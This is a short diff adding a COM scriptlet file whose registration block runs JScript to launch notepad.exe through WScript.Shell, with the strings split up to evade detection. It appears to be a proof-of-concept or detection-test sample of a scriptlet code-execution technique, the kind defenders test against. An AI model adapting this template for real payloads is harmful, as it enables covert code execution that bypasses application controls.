@@ -1,0 +1,8 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="Test"
+    classid="{c1fc5006-0ec2-44eb-aff7-9f063462eb80}" >
+	<script language="JScript"><![CDATA[var r = new ActiveXObject("WScrip"+"t.S"+"hell").Run("notepad.e"+"xe");]]></script>
+</registration>
+</scriptlet>
